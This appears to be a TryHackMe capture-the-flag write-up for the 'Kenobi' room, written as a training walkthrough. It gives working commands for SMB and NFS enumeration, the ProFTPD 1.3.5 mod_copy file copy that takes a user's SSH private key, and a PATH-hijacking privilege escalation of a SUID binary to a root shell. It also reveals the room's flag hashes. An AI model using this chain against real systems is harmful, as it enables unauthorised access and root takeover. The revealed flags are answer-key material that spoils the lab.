# 🛡️ Kenobi — TryHackMe Write-Up

> Walkthrough on exploiting a Linux machine. Enumerate Samba for shares, manipulate a vulnerable version of proftpd and escalate your privileges with path variable manipulation.  
> Room: **[Kenobi](https://tryhackme.com/room/kenobi)**

<p align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/46f437a95b1de43238c290a9c416c8d4.png" alt="Kenobi banner" />
</p>

<p align="center">
  <a href="https://tryhackme.com/room/kenobi"><img src="https://img.shields.io/badge/TryHackMe-Kenobi-red?logo=tryhackme&logoColor=white" /></a>
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" />
  <img src="https://img.shields.io/badge/Focus-SMB%20%7C%20FTP%20%7C%20PrivEsc-blue" />
  <img src="https://img.shields.io/badge/Platform-Linux-black?logo=linux" />
</p>

---

## 📚 Table of Contents
- [About](#-about)
- [Topics Covered](#-topics-covered)
- [Appendix Archive](#-appendix-archive)
- [Deploy the Machine](#-deploy-the-machine)
- [Enumeration](#-enumeration)
- [SMB Enumeration & Exploitation](#-smb-enumeration--exploitation)
- [ProFTPD Exploit (mod_copy)](#proftpd-exploit-mod_copy)
- [Mounting NFS & Initial Access](#-mounting-nfs--initial-access)
- [Privilege Escalation (PATH manipulation)](#-privilege-escalation-path-manipulation)
- [Answers (Hidden)](#-answers-hidden)
- [Further Reading & Credits](#-further-reading--credits)

---

## 🔎 About
This write-up documents the Kenobi TryHackMe room. The goal is to enumerate network services (SMB/NFS/FTP), abuse a vulnerable ProFTPD `mod_copy` module to retrieve an SSH key, access the user account, and escalate to root via a misconfigured SUID binary that uses the PATH environment variable insecurely.

> **Use only on authorised machines and lab environments.**

---

## ✅ Topics Covered
- Network Enumeration
- SMB Enumeration
- SMB Exploitation (anonymous shares)
- ProFTPD `mod_copy` abuse (unauthenticated file copy)
- Mounting NFS exports
- Privilege Escalation via PATH manipulation and SUID binaries

---

## 🚀 Deploy the Machine
1. Connect to the TryHackMe network and deploy the Kenobi machine.  
`No answer needed`

2. Scan the machine with `nmap` to discover services (example output preserved below in CLI block).

```bash
kali@kali:~/CTFs/tryhackme/Kenobi$ sudo nmap -A -p- MACHINE_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 19:52 CEST
Nmap scan report for MACHINE_IP
Host is up (0.030s latency).
Not shown: 65524 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp   open  rpcbind     2-4 (RPC #100000)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
...
Nmap done: 1 IP address (1 host up) scanned in 60.38 seconds
```

**How many ports are open?**  
`7`

---

## 🧭 SMB Enumeration & Shares
Use `nmap`'s SMB scripts to enumerate shares:

```bash
sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP
```

Example output (preserved from lab):

```
| smb-enum-shares:
|   account_used: guest
|   \MACHINE_IP\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Path: C:	mp
|     Anonymous access: READ/WRITE
|   \MACHINE_IP\anonymous:
|     Type: STYPE_DISKTREE
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|   \MACHINE_IP\print$:
|     Type: STYPE_DISKTREE
|     Path: C:ar\lib\samba\printers
|     Anonymous access: <none>
```

**How many shares have been found?**  
`3`

Connect with `smbclient` to the `anonymous` share and list files (CLI preserved):

```bash
smbclient //MACHINE_IP/anonymous
# then at the smb prompt:
ls
```
You should see a file named `log.txt` on the share.

You can recursively download the share with `smbget -R smb://MACHINE_IP/anonymous` and inspect files like `log.txt` to find clues (SSH key info, ProFTPD notes).

**What port is FTP running on?**  
`21`

Use `nmap` to enumerate NFS exports:

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP
```

**What mount can we see?**  
`/var`

---

## ⚙️ ProFTPD — mod_copy Exploit (Initial Access)
ProFTPD 1.3.5 with `mod_copy` allows unauthenticated clients to issue `SITE CPFR` and `SITE CPTO` to copy files. We can copy `/home/kenobi/.ssh/id_rsa` to `/var/tmp/id_rsa`:

```
nc MACHINE_IP 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [MACHINE_IP]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

`No answer needed`

---

## 🗂️ Mount NFS & Retrieve SSH Key (Local Machine)
On your attacking machine, mount the NFS export and retrieve the copied SSH private key:

```bash
mkdir /mnt/kenobiNFS
sudo mount MACHINE_IP:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@MACHINE_IP
```

Once logged in as `kenobi`, view the `user.txt`:

```
kenobi@kenobi:~$ cat user.txt
<hidden - click to reveal below>
```

---

## 🔐 Privilege Escalation — PATH Variable Manipulation
Find SUID binaries that may be dangerous:

```bash
find / -perm -u=s -type f 2>/dev/null
```

One unusual SUID binary is `/usr/bin/menu`.

Run the binary to see available options (preserve CLI output):

```bash
/usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
```

Because `menu` calls common utilities **without full paths**, we can inject a fake binary into our `PATH`. Example (done on the target):
```bash
cd /tmp
echo /bin/bash > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
# choose option that triggers curl (or similar) → root shell!
```

This grants a root shell due to the binary running with elevated privileges and using our `PATH` to resolve commands.

---

## 🧩 Answers (Hidden)
Click to reveal the answers and flags found during the lab.

<details>
  <summary><strong>Kenobi user.txt</strong> (click to reveal)</summary>

  ```txt
  d0b0f3f53b6caa532a83915e19224899
  ```
</details>

<details>
  <summary><strong>Kenobi root.txt</strong> (click to reveal)</summary>

  ```txt
  177b3cd8562289f37382721c28381f02
  ```
</details>

---

## 📚 Further Reading & Credits
- ProFTPD `mod_copy` exploit details and PoCs (searchsploit entries for ProFTPD 1.3.5)  
- NFS and RPC enumeration techniques  
- PATH-based privilege escalation writeups and SUID pitfalls

---

### ⚠️ Disclaimer
This write-up is for **educational purposes only**. Do not attempt these techniques on systems you do not own or have explicit permission to test.

---

### ⭐ If this helped you, consider leaving a star on the repo!

